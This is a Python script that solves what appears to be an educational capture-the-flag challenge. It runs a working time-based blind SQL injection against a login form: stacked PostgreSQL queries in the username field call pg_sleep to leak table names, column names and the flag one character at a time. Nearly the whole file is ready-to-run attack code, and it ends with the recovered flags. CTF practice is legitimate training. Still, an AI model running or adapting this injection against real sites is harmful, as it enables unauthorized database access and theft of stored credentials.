import requests
from datetime import datetime
from string import ascii_lowercase, digits, ascii_uppercase

sess = requests.Session()
sess.get("http://edu-ctf.zoolab.org:10210/")

def exec_query(query:str):
    with sess.post(
        "http://edu-ctf.zoolab.org:10210/",
        data={
            "username": f"';{query}; --'",
            "password":"",
            "current_time":int(datetime.now().timestamp())
        }
    ) as resp:
        pass

table_name = "s3cr3t_t4b1e"

def get_databasename():
    from string import ascii_lowercase, digits
    dict_char = ascii_lowercase + "_" + digits + "{}" + ","
    idx = 1
    res = ""
    while True:
        times = []
        for c in dict_char:
            st = datetime.now()
            exec_query(f"SELECT case when substr(array_agg(concat(table_name))::text, {idx}, 1)='{c}' then pg_sleep(2) else pg_sleep(0) end FROM information_schema.tables")
            ed = datetime.now()
            times.append((ed - st).seconds)
            if (ed - st).seconds == 2:
                break
        if max(times) == 0:
            break
        guessed_char = dict_char[times.index(max(times))]
        res += guessed_char
        print(f'{guessed_char}: {max(times)}')
        print(res)
        
        idx+=1
    return res

colname = ["user_id","user_account","user_paslword"]

def get_colname():
    from string import ascii_lowercase, digits
    dict_char = ascii_lowercase + "_" + digits + "{}" + ","
    idx = 1
    res = ""
    while True:
        times = []
        for c in dict_char:
            st = datetime.now()
            exec_query(f"SELECT case when substr(array_agg(concat(column_name))::text, {idx}, 1)='{c}' then pg_sleep(2) else pg_sleep(0) end FROM information_schema.columns WHERE table_name='{table_name}'")
            ed = datetime.now()
            times.append((ed - st).seconds)
            if (ed - st).seconds == 2:
                break
        if max(times) == 0:
            break
        guessed_char = dict_char[times.index(max(times))]
        res += guessed_char
        print(f'{guessed_char}: {max(times)}')
        idx+=1
    return res

def get_data():
    dict_char = ascii_lowercase + "_" + digits + "{}" + "," + '"' + ascii_uppercase
    idx = 1
    res = ""
    while True:
        times = []
        for c in dict_char:
            st = datetime.now()
            exec_query(f"SELECT case when substr(array_agg(concat(fl4g))::text, {idx}, 1)='{c}' then pg_sleep(2) else pg_sleep(0) end FROM {table_name}")
            ed = datetime.now()
            times.append((ed - st).seconds)
            if (ed - st).seconds == 2:
                break
        if max(times) == 0:
            break
        guessed_char = dict_char[times.index(max(times))]
        res += guessed_char
        print(f'{guessed_char}: {max(times)}')
        print(res)
        idx+=1
    return res

#print(get_databasename())
#print(get_colname())
#print(get_data())
# FLAG{B1inD_SqL_IiIiiNj3cTo0n}
# FLAG{B1inD_SqL_IiIiiNj3cT10n}